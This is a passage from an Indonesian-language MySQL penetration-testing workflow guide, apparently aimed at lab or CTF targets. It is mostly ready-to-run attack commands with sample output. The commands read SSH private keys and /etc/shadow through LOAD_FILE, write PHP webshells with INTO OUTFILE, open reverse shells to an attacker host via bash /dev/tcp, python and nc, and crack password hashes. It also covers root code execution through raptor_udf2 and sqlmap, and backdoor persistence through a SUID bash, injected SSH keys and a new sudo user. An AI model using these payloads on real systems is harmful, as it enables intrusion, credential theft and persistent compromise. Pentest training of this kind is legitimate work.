➡️ **Berhasil! Catat username yang ada (untuk lateral movement via SSH):**

Bash

```
mysql -h $TARGET -u $DB_USER -p"$DB_PASS" \
    -e "SELECT LOAD_FILE('/etc/passwd');" | sed '1d' \
    > ~/mysql_loot/files/target_passwd.txt

# Extract usernames dengan shell login
grep -v "nologin\|false\|sync" ~/mysql_loot/files/target_passwd.txt | cut -d: -f1
```

SQL

```
-- Baca file konfigurasi web (mencari credentials aplikasi)
SELECT LOAD_FILE('/var/www/html/config.php');
SELECT LOAD_FILE('/var/www/html/wp-config.php');
SELECT LOAD_FILE('/var/www/html/.env');
SELECT LOAD_FILE('/var/www/html/application/config/database.php');

-- Baca SSH private key (target utama!)
SELECT LOAD_FILE('/root/.ssh/id_rsa');
SELECT LOAD_FILE('/home/admin/.ssh/id_rsa');
SELECT LOAD_FILE('/home/www-data/.ssh/id_rsa');

-- Baca shadow file (butuh MySQL berjalan sebagai root OS)
SELECT LOAD_FILE('/etc/shadow');

-- Info sistem
SELECT LOAD_FILE('/proc/version');
SELECT LOAD_FILE('/etc/os-release');
```

**OUTPUT BERHASIL ✅ — SSH private key ditemukan:**

text

```
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA0Z3VS5JJcds3xHn/ygWep4VBs...
...
-----END RSA PRIVATE KEY-----
```

➡️ **SIMPAN DAN GUNAKAN:**

Bash

```
mysql -h $TARGET -u $DB_USER -p"$DB_PASS" \
    -e "SELECT LOAD_FILE('/root/.ssh/id_rsa');" | sed '1d' \
    > ~/mysql_loot/files/root_id_rsa.txt

# Bersihkan output (kadang ada trailing whitespace)
chmod 600 ~/mysql_loot/files/root_id_rsa.txt

# Test login SSH
ssh -i ~/mysql_loot/files/root_id_rsa.txt root@$TARGET

# Jika ada passphrase → crack
ssh2john ~/mysql_loot/files/root_id_rsa.txt > ~/mysql_loot/hashes/ssh_key.hash
john ~/mysql_loot/hashes/ssh_key.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

**OUTPUT GAGAL ❌ — LOAD_FILE mengembalikan NULL:**

text

```
+-------------------------------+
| LOAD_FILE('/etc/passwd')      |
+-------------------------------+
| NULL                          |
+-------------------------------+
```

➡️ Ada beberapa kemungkinan:

SQL

```
-- Cek 1: Apakah kita punya FILE privilege?
SHOW GRANTS;
-- Jika tidak ada "FILE" → kita tidak punya hak baca file sistem

-- Cek 2: Apakah secure_file_priv sudah terset?
SELECT @@global.secure_file_priv;

-- Cek 3: Coba file yang pasti ada dan readable
SELECT LOAD_FILE('/proc/version');
SELECT LOAD_FILE('/etc/hostname');
```

➡️ Jika masih NULL setelah semua cek → `secure_file_priv = NULL` atau tidak punya FILE privilege. Skip ke **Fase 7 (Hash Cracking)** atau **Fase 8 (UDF)**

---

## ═══════════════════════════════════════

## FASE 6: FILE WRITE VIA INTO OUTFILE (Webshell)

## ═══════════════════════════════════════

> **Prasyarat:** `secure_file_priv = ''` DAN ada web server (port 80/443) DAN web root directory writable oleh user `mysql`

### Langkah 6.1 — Identifikasi Web Root

SQL

```
-- Coba baca file untuk verifikasi web root
SELECT LOAD_FILE('/var/www/html/index.php');
SELECT LOAD_FILE('/var/www/html/index.html');

-- Cari web root dari config Apache/Nginx
SELECT LOAD_FILE('/etc/apache2/sites-enabled/000-default.conf');
SELECT LOAD_FILE('/etc/nginx/sites-enabled/default');
```

**OUTPUT BERHASIL ✅ — Web root teridentifikasi:**

text

```
DocumentRoot /var/www/html
```

➡️ Web root adalah `/var/www/html`. Lanjut tulis webshell.

---

### Langkah 6.2 — Tulis Webshell PHP

SQL

```
-- Command 1: Simple webshell
SELECT '<?php if(isset($_GET["cmd"])){system($_GET["cmd"]);}else{echo "shell ready";} ?>' 
INTO OUTFILE '/var/www/html/cmd.php';
```

**OUTPUT BERHASIL ✅:**

text

```
Query OK, 1 row affected (0.01 sec)
```

Bash

```
# Validasi dari terminal Parrot OS:
# Test 1: Cek apakah file terupload
curl -s http://$TARGET/cmd.php
# Output yang diharapkan: shell ready

# Test 2: Eksekusi command
curl -s "http://$TARGET/cmd.php?cmd=id"
# Output yang diharapkan: uid=33(www-data) gid=33(www-data)

curl -s "http://$TARGET/cmd.php?cmd=whoami"
curl -s "http://$TARGET/cmd.php?cmd=hostname"
```

**OUTPUT BERHASIL ✅ — RCE bekerja:**

text

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

➡️ **RCE via webshell! Upgrade ke reverse shell:**

Bash

```
# Setup listener di terminal lain
nc -lvnp $LPORT

# Trigger reverse shell
# Method 1: bash
curl -G "http://$TARGET/cmd.php" \
    --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'"

# Method 2: python3
curl -G "http://$TARGET/cmd.php" \
    --data-urlencode "cmd=python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$LHOST\",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"

# Method 3: nc mkfifo
curl -G "http://$TARGET/cmd.php" \
    --data-urlencode "cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $LPORT >/tmp/f"
```

**OUTPUT BERHASIL ✅ — Reverse shell diterima:**

text

```
Listening on 0.0.0.0 4444
Connection received on 10.10.11.200 54321
$ whoami
www-data
$ 
```

➡️ **SHELL sebagai www-data!** Selanjutnya:

- Upgrade shell: `python3 -c 'import pty; pty.spawn("/bin/bash")'`
- Lanjut ke `[🐧 44 — Linux Privilege Escalation Workflow](/docs/linux-privesc)` untuk privilege escalation

**OUTPUT GAGAL ❌ — ERROR 1086 (File already exists):**

text

```
ERROR 1086 (HY000): File '/var/www/html/cmd.php' already exists
```

➡️ File sudah ada. Ganti nama:

SQL

```
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell2.php';
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/cmd123.php';
```

**OUTPUT GAGAL ❌ — ERROR 1 Permission denied:**

text

```
ERROR 1 (HY000): Can't create/write to file '/var/www/html/cmd.php' (Errcode: 13 - Permission denied)
```

➡️ User `mysql` tidak punya write permission ke web root. Coba alternatif:

SQL

```
-- Tulis ke /tmp dulu, lalu copy manual (jika ada RCE lain)
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/tmp/shell.php';

-- Atau coba direktori lain yang writable
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/uploads/shell.php';
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/wp-content/uploads/shell.php';
```

**OUTPUT GAGAL ❌ — curl 404, file tidak ditemukan via HTTP:**

text

```
404 Not Found
```

➡️ Web root berbeda. Cari web root yang benar:

SQL

```
SELECT LOAD_FILE('/etc/apache2/sites-enabled/000-default.conf');
SELECT LOAD_FILE('/etc/nginx/conf.d/default.conf');
-- Atau coba path umum lainnya:
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/srv/www/htdocs/shell.php';
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/opt/lampp/htdocs/shell.php';
```

---

## ═══════════════════════════════════════

## FASE 7: HASH EXTRACTION & CRACKING

## ═══════════════════════════════════════

> **Tujuan:** Dump semua password hash dari MySQL, lalu crack untuk dapat plaintext credentials

### Langkah 7.1 — Dump MySQL User Hashes

SQL

```
-- Format MySQL versi lama (< 5.7): kolom 'password'
SELECT user, password, host FROM mysql.user;

-- Format MySQL versi modern (>= 5.7 / MariaDB): kolom 'authentication_string'
SELECT user, authentication_string, host FROM mysql.user;

-- Universal (coba dua-duanya):
SELECT user, host,
       COALESCE(authentication_string, password) as hash
FROM mysql.user 
WHERE COALESCE(authentication_string, password) != '';
```

**OUTPUT BERHASIL ✅:**

text

```
+------------------+-----------+-------------------------------------------+
| user             | host      | hash                                      |
+------------------+-----------+-------------------------------------------+
| root             | localhost | *2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19 |
| wpuser           | localhost | *1A2B3C4D5E6F7A8B9C0D1E2F3A4B5C6D7E8F9A0 |
| debian-sys-maint | localhost | *8E67B5F1E1C6DC25A8F8BB02B6D4A8C9E0F1A2B |
+------------------+-----------+-------------------------------------------+
```

Bash

```
# Simpan hashes ke file untuk cracking
mysql -h $TARGET -u $DB_USER -p"$DB_PASS" \
    -e "SELECT user, COALESCE(authentication_string, password) FROM mysql.user WHERE COALESCE(authentication_string, password) != '';" \
    | tail -n +2 \
    | awk '{print $1":"$2}' \
    > ~/mysql_loot/hashes/mysql_hashes.txt

cat ~/mysql_loot/hashes/mysql_hashes.txt
```

---

### Langkah 7.2 — Identifikasi Tipe Hash

**Cara identifikasi cepat:**

|Prefix/Format|Jenis Hash|Hashcat Mode|
|---|---|---|
|`*2470C0C0...` (40 hex + asterisk)|MySQL 4.1/5.x (Double SHA-1)|`-m 300`|
|`$P$B...`|WordPress/phpBB (phpass MD5)|`-m 400`|
|`$2y$` atau `$2a$`|bcrypt|`-m 3200`|
|`$6$...`|SHA-512 crypt|`-m 1800`|
|`5d41402abc4b...` (32 hex tanpa prefix)|MD5 plain|`-m 0`|

Bash

```
# Identifikasi otomatis dengan hashid
hashid ~/mysql_loot/hashes/mysql_hashes.txt

# Atau gunakan hash-identifier
hash-identifier
# (paste hash saat diminta)
```

---

### Langkah 7.3 — Crack Hashes

Bash

```
# Command 1: MySQL Native Hash (mode 300)
# Ekstrak hanya hash tanpa user prefix
grep -oP '\*[A-F0-9]{40}' ~/mysql_loot/hashes/mysql_hashes.txt \
    > ~/mysql_loot/hashes/mysql_only.hash

hashcat -m 300 ~/mysql_loot/hashes/mysql_only.hash \
    /usr/share/wordlists/rockyou.txt \
    --force -o ~/mysql_loot/hashes/cracked_mysql.txt

# Command 2: WordPress hash (mode 400)
grep -oP '\$P\$[A-Za-z0-9./]{31}' ~/mysql_loot/hashes/mysql_hashes.txt \
    > ~/mysql_loot/hashes/wp_only.hash

hashcat -m 400 ~/mysql_loot/hashes/wp_only.hash \
    /usr/share/wordlists/rockyou.txt \
    --force -o ~/mysql_loot/hashes/cracked_wp.txt

# Command 3: Bcrypt (mode 3200) — LAMBAT, tapi worth it
hashcat -m 3200 ~/mysql_loot/hashes/bcrypt.hash \
    /usr/share/wordlists/rockyou.txt \
    --force -o ~/mysql_loot/hashes/cracked_bcrypt.txt

# Command 4: Crack dengan rules untuk password yang lebih kompleks
hashcat -m 300 ~/mysql_loot/hashes/mysql_only.hash \
    /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/best64.rule \
    --force -o ~/mysql_loot/hashes/cracked_rules.txt

# Command 5: John the Ripper sebagai alternatif
john ~/mysql_loot/hashes/mysql_hashes.txt \
    --wordlist=/usr/share/wordlists/rockyou.txt \
    --format=mysql-sha1
```

**OUTPUT BERHASIL ✅ — Hashcat crack:**

text

```
*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19:Password123!
*1A2B3C4D5E6F7A8B9C0D1E2F3A4B5C6D7E8F9A0:wordpress2024
```

➡️ **Password berhasil di-crack!** Simpan:

Bash

```
cat ~/mysql_loot/hashes/cracked_mysql.txt
# Format: hash:password

# Simpan ke creds file
echo "root:Password123!" >> ~/mysql_loot/creds/found_creds.txt
echo "wpuser:wordpress2024" >> ~/mysql_loot/creds/found_creds.txt
```

➡️ Test credential reuse ke service lain (SSH, SMB, WinRM)

**OUTPUT GAGAL ❌ — 0 hashes cracked:**

text

```
Session..........: hashcat
Status...........: Exhausted
Recovered........: 0/3 (0.00%)
```

➡️ Coba wordlist lebih besar atau rules lebih agresif:

Bash

```
# Coba wordlist seclists
hashcat -m 300 ~/mysql_loot/hashes/mysql_only.hash \
    /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz \
    --force

# Coba mode kombinasi
hashcat -m 300 ~/mysql_loot/hashes/mysql_only.hash \
    -a 1 /usr/share/seclists/Passwords/Common-Credentials/top-usernames-shortlist.txt \
    /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt

# Google: "hashcat mysql hash not cracking" → cari tips wordlist
```

---

## ═══════════════════════════════════════

## FASE 8: UDF RCE — USER DEFINED FUNCTIONS

## ═══════════════════════════════════════

> **Tujuan:** Eksekusi perintah OS langsung dari MySQL jika MySQL berjalan sebagai root  
> **Prasyarat:** Privilege SUPER atau FILE, dan bisa write ke plugin_dir

### Langkah 8.1 — Cek Prasyarat UDF

SQL

```
-- Cek privilege
SHOW GRANTS;
-- Harus ada: SUPER atau FILE privilege

-- Cek lokasi plugin directory
SHOW VARIABLES LIKE 'plugin_dir';
-- Contoh output: /usr/lib/mysql/plugin/

-- Cek apakah MySQL berjalan sebagai root OS
SELECT @@global.secure_file_priv;
-- Jika '' → bisa write ke plugin dir
```

**Jika semua prasyarat terpenuhi → lanjut ke Langkah 8.2**

---

### Langkah 8.2 — Method 1: sqlmap --os-shell (PALING MUDAH)

Bash

```
# Di terminal Parrot OS (di luar mysql prompt):
sqlmap -d "mysql://$DB_USER:$DB_PASS@$TARGET:3306/mysql" \
    --os-shell \
    --technique=U

# Tunggu hingga sqlmap berhasil upload UDF
# Kemudian ketik command saat prompt muncul:
# os-shell> id
# os-shell> whoami
# os-shell> cat /etc/shadow
```

**OUTPUT BERHASIL ✅:**

text

```
[*] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> id
uid=0(root) gid=0(root) groups=0(root)
```

➡️ **ROOT SHELL via MySQL!**

Bash

```
# Spawn reverse shell dari os-shell
# os-shell> bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'
```

**OUTPUT GAGAL ❌ — sqlmap gagal upload:**  
➡️ Coba manual method di Langkah 8.3

---

### Langkah 8.3 — Method 2: Manual UDF (raptor_udf2)

Bash

```
# Step 1: Cari dan ekstrak exploit UDF dari searchsploit
searchsploit mysql udf
searchsploit -m 1518    # raptor_udf2.c

# Step 2: Kompilasi untuk 64-bit (sesuaikan dengan target)
mv 1518.c raptor_udf2.c
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

# Cek arsitektur sebelum kompilasi (pastikan match)
file raptor_udf2.so
# Output harus: ELF 64-bit LSB shared object
```

SQL

```
-- Step 3: Upload ke MySQL (di dalam mysql prompt)
USE mysql;
CREATE TABLE foo(line blob);
INSERT INTO foo values(load_file('/tmp/raptor_udf2.so'));

-- Step 4: Dump ke plugin directory
SELECT * FROM foo INTO DUMPFILE '/usr/lib/mysql/plugin/raptor_udf2.so';

-- Step 5: Register function
CREATE FUNCTION sys_exec RETURNS int SONAME 'raptor_udf2.so';

-- Step 6: Test eksekusi
SELECT sys_exec('id > /tmp/udf_test.txt');
```

Bash

```
# Verifikasi dari terminal (jika bisa baca file)
mysql -h $TARGET -u $DB_USER -p"$DB_PASS" \
    -e "SELECT LOAD_FILE('/tmp/udf_test.txt');"
```

**OUTPUT BERHASIL ✅:**

text

```
+-------------------------------------------+
| LOAD_FILE('/tmp/udf_test.txt')             |
+-------------------------------------------+
| uid=0(root) gid=0(root) groups=0(root)    |
+-------------------------------------------+
```

➡️ MySQL berjalan sebagai root! Eksploitasi lebih lanjut:

SQL

```
-- Buat backdoor SUID bash
SELECT sys_exec('chmod u+s /bin/bash');
-- Lalu di shell target: /bin/bash -p → root!

-- Atau tambahkan SSH key
SELECT sys_exec('mkdir -p /root/.ssh && echo "ssh-rsa AAAA... kali@parrot" >> /root/.ssh/authorized_keys');

-- Atau spawn reverse shell
SELECT sys_exec('bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"');
```

**OUTPUT GAGAL ❌ — ERROR 1126: Can't open shared library:**

text

```
ERROR 1126 (HY000): Can't open shared library 'raptor_udf2.so'
```

➡️ Kemungkinan arsitektur tidak cocok:

Bash

```
# Cek arsitektur target OS
mysql -h $TARGET -u $DB_USER -p"$DB_PASS" \
    -e "SELECT LOAD_FILE('/proc/version');"
# Jika "x86_64" → kompilasi 64-bit sudah benar
# Jika "i686" → perlu kompilasi 32-bit:
gcc -g -c raptor_udf2.c -fPIC -m32
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc -m32
```

---

## ═══════════════════════════════════════

## FASE 9: LATERAL MOVEMENT VIA CREDENTIAL REUSE

## ═══════════════════════════════════════

> Setiap kali dapat credentials dari MySQL, test ke SEMUA service yang mungkin aktif

### Langkah 9.1 — Test Credentials ke Service Lain

Bash

```
# Setelah dapat credentials dari MySQL (plaintext atau cracked hash)
# Test semua service ini:

# SSH (Linux target)
ssh $DB_USER@$TARGET
nxc ssh $TARGET -u "$DB_USER" -p "$DB_PASS"

# Jika ada user lain dari /etc/passwd:
for user in admin www-data user1; do
    ssh "$user@$TARGET" -o BatchMode=yes -o ConnectTimeout=5 2>/dev/null && echo "[+] SSH $user WORKS"
done

# SMB (Windows atau Samba Linux)
nxc smb $TARGET -u "$DB_USER" -p "$DB_PASS"

# FTP
nxc ftp $TARGET -u "$DB_USER" -p "$DB_PASS"

# WinRM (Windows)
nxc winrm $TARGET -u "$DB_USER" -p "$DB_PASS"
```

**OUTPUT BERHASIL ✅ — SSH berhasil:**

text

```
SSH  10.10.11.200  22  [+] root:Password123! Linux - Shell access!
```

➡️ Login SSH:

Bash

```
ssh root@$TARGET
# atau dengan password spesifik:
sshpass -p "Password123!" ssh root@$TARGET
```

➡️ Lanjut ke **`[06. SSH Exploitation & Tunneling Workflow — Master Field Guide](/docs/ssh)`**

---

### Langkah 9.2 — Cross-Service Credential Testing Chart

text

```
MySQL Credentials Found
        │
        ├─ ─→ Port 22   (SSH)      → <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>
        ├──→ Port 21   (FTP)      → <a href="/docs/ftp" class="text-[#00b4d8] hover:underline font-mono font-semibold">07_ftp_workflow.md</a>
        ├──→ Port 80   (HTTP)     → Login panel web, try admin creds
        ├──→ Port 443  (HTTPS)    → Login panel web, try admin creds
        ├──→ Port 445  (SMB)      → <a href="/docs/smb-samba" class="text-[#00b4d8] hover:underline font-mono font-semibold">05_smb_samba_workflow.md</a>
        ├──→ Port 3389 (RDP)      → <a href="/docs/rdp" class="text-[#00b4d8] hover:underline font-mono font-semibold">12_rdp_workflow.md</a>
        ├──→ Port 5985 (WinRM)    → evil-winrm
        ├──→ Port 1433 (MSSQL)    → <a href="/docs/mssql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14b_mssql_workflow.md</a>
        └──→ Port 5432 (PostgreSQL) → <a href="/docs/postgresql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14c_postgresql_workflow.md</a>
```

---

## ═══════════════════════════════════════

## FASE 10: POST-EXPLOITATION (Setelah Dapat Shell)

## ═══════════════════════════════════════

### Langkah 10.1 — Jika Dapat Shell sebagai www-data (via Webshell)

Bash

```
# Di shell www-data:

# 1. Stabilize shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg

# 2. Cari credential MySQL dari config files (untuk akses MySQL lokal)
find /var/www -name "*.php" -exec grep -l "mysqli\|PDO\|mysql_connect" {} \; 2>/dev/null
cat /var/www/html/wp-config.php | grep -E "DB_|define"

# 3. Cari file sensitif
find / -name "*.kdbx" -o -name "id_rsa" -o -name ".env" 2>/dev/null
find /home -name "*.txt" -o -name "*.pdf" 2>/dev/null | head -20

# 4. Cek sudo privileges
sudo -l

# 5. Lanjut privesc
# → ke <a href="/docs/linux-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">44_linux_privesc_workflow.md</a>
```

### Langkah 10.2 — Jika Dapat Shell sebagai root via UDF

Bash

```
# Di shell root via MySQL UDF:

# 1. Dump shadow file untuk crack offline
cat /etc/shadow | tee ~/mysql_loot/files/shadow.txt

# 2. Tambahkan SSH key untuk persistent access
mkdir -p /root/.ssh
echo "ssh-rsa AAAA...kali_public_key..." >> /root/.ssh/authorized_keys
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys

# 3. Buat user backdoor
useradd -m -s /bin/bash -G sudo backdoor_user
echo "backdoor_user:B@ckd00rP@ss!" | chpasswd

# 4. Login SSH langsung sebagai root
ssh -i ~/mysql_loot/keys/id_rsa root@$TARGET
```

---

## ═══════════════════════════════════════

## TROUBLESHOOTING — SEMUA ERROR & SOLUSINYA

## ═══════════════════════════════════════

|Error|Penyebab|Solusi|
|---|---|---|
|`ERROR 1045: Access denied`|Password salah atau host tidak diizinkan|Coba SSH tunnel, cek `/etc/mysql/debian.cnf`|
|`ERROR 1130: Host not allowed`|Whitelist host MySQL tidak include IP kamu|`ssh -L 33306:127.0.0.1:3306 user@target -N`|
|`ERROR 2003: Connection refused`|MySQL bind ke localhost saja|SSH port forwarding wajib|
|`ERROR 1290: secure-file-priv`|FILE operations dibatasi|`SHOW VARIABLES LIKE 'secure_file_priv'` → tulis hanya ke direktori yang diizinkan|
|`LOAD_FILE() returns NULL`|File tidak ada, atau tidak readable, atau size terlalu besar|Coba `/etc/hostname` dulu untuk verifikasi|
|`ERROR 1086: File already exists`|INTO OUTFILE tidak bisa overwrite|Ganti nama file tujuan (shell2.php, cmd2.php)|
|`ERROR 1: Permission denied (Errcode: 13)`|User mysql tidak bisa write ke direktori|Coba `/tmp/` atau direktori writable lain|
|`ERROR 1126: Can't open shared library`|UDF .so arsitektur tidak cocok|Kompilasi ulang dengan `-m32` atau `-m64`|
|`Query hang/freeze`|Tabel besar tanpa LIMIT|Selalu gunakan `LIMIT 10` saat eksplorasi|
|`ERROR 2013: Lost connection`|Network timeout|Tambahkan `--connect-timeout=60`|
|`hydra: 0 valid passwords found`|Password tidak ada di wordlist|Coba rules: `--rules=best64`, atau wordlist lebih besar|
|MySQL tidak bisa diakses sama sekali|Port tidak open ke luar|Cek dari dalam server: `ss -tunlp|

---

## ═══════════════════════════════════════

## MASTER DECISION TREE (RINGKASAN)

## ═══════════════════════════════════════

text

```
START: Port 3306 Open
│
├─ FASE 0: Fingerprint
│   ├─ nmap mysql-info → Versi MySQL
│   └─ nmap mysql-empty-password → [KOSONG?] → LANGSUNG FASE 3!
│
├─ FASE 1: Credential Discovery (Jika Belum Punya Creds)
│   ├─ /etc/mysql/debian.cnf     → [Ada?] → FASE 2
│   ├─ wp-config.php / .env      → [Ada?] → FASE 2
│   ├─ Credential reuse dari SMB/SSH → [Valid?] → FASE 2
│   └─ Brute force hydra/nxc    → [Crack?] → FASE 2
│
├─ FASE 2: Login MySQL
│   ├─ [Berhasil] → FASE 3
│   └─ [Gagal - Connection Refused] → SSH Tunnel → Retry
│
├─ FASE 3: Reconnaissance (9 Query Wajib)
│   ├─ SHOW GRANTS → [ROOT?] → Semua opsi tersedia
│   ├─ secure_file_priv = '' → FASE 5 (LOAD_FILE) + FASE 6 (INTO OUTFILE)
│   ├─ secure_file_priv = NULL → Skip ke FASE 7 (Hash) atau FASE 8 (UDF)
│   └─ mysql.user → FASE 7 (Hash Cracking)
│
├─ FASE 4: Database Looting
│   └─ Dump semua tabel sensitif → Cari password plaintext
│
├─ FASE 5: LOAD_FILE (Baca File Sistem)
│   ├─ /root/.ssh/id_rsa → SSH langsung sebagai root!
│   ├─ /etc/shadow → Crack offline
│   └─ wp-config.php / config.php → Lebih credentials
│
├─ FASE 6: INTO OUTFILE (Tulis Webshell)
│   └─ /var/www/html/shell.php → curl RCE → Reverse Shell → www-data
│
├─ FASE 7: Hash Cracking
│   └─ hashcat -m 300/400/3200 → Plaintext credentials → Test reuse
│
├─ FASE 8: UDF RCE
│   ├─ sqlmap --os-shell → [Mudah!] → Root shell
│   └─ Manual raptor_udf2.so → Root shell
│
└─ FASE 9-10: Lateral Movement & Post-Exploitation
    └─ Test creds ke SSH/SMB/FTP → Lanjut ke workflow service lain
```

---

## ⚡ CHEATSHEET — COPY PASTE READY

Bash

```
# === SETUP ===
export TARGET="10.10.11.200"; export LHOST="10.10.14.5"; export LPORT="4444"
export DB_USER="root"; export DB_PASS=""
mkdir -p ~/mysql_loot/{files,creds,hashes,shells}

# === DETEKSI ===
nmap -sV -p 3306 --script "mysql-*" $TARGET -oN nmap_mysql.txt
nmap -p 3306 --script mysql-empty-password $TARGET

# === CREDENTIAL DISCOVERY ===
cat /etc/mysql/debian.cnf                                    # Maintenance creds
grep -r "password\|DB_PASS" /var/www/html/ 2>/dev/null       # Web config

# === KONEKSI ===
mysql -h $TARGET -u $DB_USER -p"$DB_PASS"                   # Interaktif
mysql -h $TARGET -u $DB_USER -p"$DB_PASS" -e "SELECT 1;"    # Test non-interaktif
nxc mysql $TARGET -u $DB_USER -p "$DB_PASS"                 # Validasi NetExec

# === SSH TUNNEL (jika MySQL hanya localhost) ===
ssh -L 33306:127.0.0.1:3306 user@$TARGET -N -f
mysql -h 127.0.0.1 -P 33306 -u root -p"$DB_PASS"

# === RECON QUERIES (jalankan di prompt mysql>) ===
# SELECT version(); SELECT user(); SHOW databases;
# SHOW GRANTS; SELECT @@global.secure_file_priv;
# SELECT user, COALESCE(authentication_string,password), host FROM mysql.user;
# SHOW VARIABLES LIKE 'plugin_dir';

# === FILE OPERATIONS ===
# SELECT LOAD_FILE('/etc/passwd');
# SELECT LOAD_FILE('/root/.ssh/id_rsa');
# SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

# === DUMP DATA ===
mysqldump -h $TARGET -u $DB_USER -p"$DB_PASS" --all-databases > full_dump.sql

# === HASH CRACKING ===
hashcat -m 300 mysql.hash /usr/share/wordlists/rockyou.txt --force  # MySQL hash
hashcat -m 400 wp.hash /usr/share/wordlists/rockyou.txt --force     # WP hash
hashcat -m 3200 bcrypt.hash /usr/share/wordlists/rockyou.txt --force # bcrypt

# === UDF RCE ===
sqlmap -d "mysql://$DB_USER:$DB_PASS@$TARGET:3306/mysql" --os-shell  # Otomatis
searchsploit -m 1518    # raptor_udf2.c untuk manual UDF

# === WEBSHELL TEST ===
curl -s http://$TARGET/shell.php
curl -s "http://$TARGET/shell.php?cmd=id"

# === BRUTE FORCE ===
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://$TARGET -t 4
```

---

> **➡️ NEXT:** Setelah MySQL selesai dan dapat credentials atau shell, lanjut ke:
> 
> - **`[Pentest Workflow: Microsoft SQL Server (MSSQL) Exploitation](/docs/mssql)`** — Jika ada port 1433 (MSSQL/Windows environment)
> - **`[🐧 44 — Linux Privilege Escalation Workflow](/docs/linux-privesc)`** — Jika dapat shell www-data dan perlu escalate ke root
> - **`[06. SSH Exploitation & Tunneling Workflow — Master Field Guide](/docs/ssh)`** — Jika dapat SSH key atau password yang valid untuk SSH

[](https://messages-prod.27c852f3500f38c1e7786e2c9ff9e48f.r2.cloudflarestorage.com/aad5bafd-ac04-4d8f-9667-3d87b6995a58/1789036421233-14a_mysql_workflow.pdf?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=b33de61d4f22a31b59b25364ab5037c5%2F20260910%2Fauto%2Fs3%2Faws4_request&X-Amz-Date=20260910T103343Z&X-Amz-Expires=3600&X-Amz-Signature=d59b0d3305ea9bc6a1f05df9a87d8ae152c9c20348397a6c6f7e46f43657177e&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
